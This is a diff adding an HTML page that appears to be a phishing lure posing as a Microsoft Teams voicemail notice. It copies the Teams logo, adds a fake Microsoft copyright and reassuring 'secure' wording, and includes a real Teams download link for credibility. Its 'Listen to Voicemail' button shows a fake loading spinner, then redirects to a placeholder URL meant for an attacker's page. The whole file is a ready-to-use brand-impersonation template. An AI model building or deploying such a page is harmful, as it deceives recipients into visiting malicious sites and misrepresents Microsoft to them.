@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Missed Notification Playback</title>
+  <style>
+    /* Global Styles */
+    body {
+      background: linear-gradient(134deg, #f4f3fa, #dfdff6);
+      font-family: 'Segoe UI', Tahoma, Geneva, sans-serif;
+      color: #323232;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* Main Container */
+    .container {
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+      padding: 24px;
+      text-align: center;
+      width: 90%;
+      max-width: 500px;
+    }
+
+    /* Header */
+    .header {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+
+    .header img {
+      height: 40px;
+      margin-right: 12px;
+    }
+
+    .header h1 {
+      color: #6365a6;
+      font-size: 1.8em;
+      margin: 0;
+    }
+
+    /* Secure Icon */
+    .icon-secure {
+      font-size: 50px;
+      color: #6365a6;
+      margin-top: 16px;
+      opacity: 0.8;
+    }
+
+    /* Primary Message */
+    .message {
+      color: #454545;
+      font-size: 17px;
+      line-height: 1.6;
+      margin-top: 16px;
+    }
+
+    /* Button Styles */
+    .button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #6365a6;
+      color: #fff;
+      padding: 12px 24px;
+      font-weight: bold;
+      font-size: 16px;
+      border-radius: 5px;
+      border: none;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 24px;
+    }
+
+    .button:hover {
+      background-color: #575aa8;
+    }
+
+    /* Spinner Styles */
+    .spinner {
+      display: none;
+      border: 2px solid transparent;
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      width: 20px;
+      height: 20px;
+      margin-right: 10px;
+      animation: spin 1s linear infinite;
+    }
+
+    /* Footer */
+    .footer {
+      font-size: 12px;
+      color: #676767;
+      margin-top: 32px;
+    }
+
+    .footer a {
+      color: #6365a6;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .install-link {
+      display: block;
+      font-size: 14px;
+      margin-top: 16px;
+    }
+
+    /* Responsive Styles */
+    @media (max-width: 600px) {
+      .container {
+        padding: 16px;
+      }
+
+      .header h1 {
+        font-size: 1.5em;
+      }
+
+      .message {
+        font-size: 16px;
+      }
+
+      .button {
+        font-size: 14px;
+        padding: 10px 20px;
+      }
+
+      .icon-secure {
+        font-size: 40px;
+      }
+
+      .install-link {
+        font-size: 13px;
+      }
+    }
+
+    /* Spinner Animation */
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="header">
+      <img src="https://ribboncommunications.com/sites/default/files/microsoft-teams-logo-medium.png" alt="Microsoft Teams Logo">
+      <h1>Voicemail Access</h1>
+    </div>
+
+    <div class="icon-secure" aria-label="Secure Icon">🔒</div>
+    <p class="message">Your voicemail message is securely awaiting your attention.</p>
+
+    <button class="button" id="voicemailButton" aria-label="Listen to Voicemail">
+      <div class="spinner" id="spinner"></div>
+      <span id="buttonText">Listen to Voicemail</span>
+    </button>
+
+    <div class="footer">
+      <a href="https://www.microsoft.com/en/microsoft-teams/download-app" target="_blank" class="install-link">Download Microsoft Teams to stay connected</a>
+      <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a> | <a href="#">Support</a></p>
+      <p>&copy; 2024 Microsoft Teams</p>
+    </div>
+  </div>
+
+  <script>
+    // Handle voicemail playback (simulated)
+    function playVoicemail() {
+      const spinner = document.getElementById("spinner");
+      const buttonText = document.getElementById("buttonText");
+
+      // Show the spinner and change button text
+      spinner.style.display = "inline-block";
+      buttonText.innerText = "Loading...";
+
+      // Simulate loading time (2 seconds)
+      setTimeout(() => {
+        window.location.href = "link"; // Redirect to voicemail
+      }, 2000);
+    }
+
+    // Add event listener to the button
+    document.getElementById("voicemailButton").addEventListener("click", playVoicemail);
+  </script>
+
+</body>
+</html>
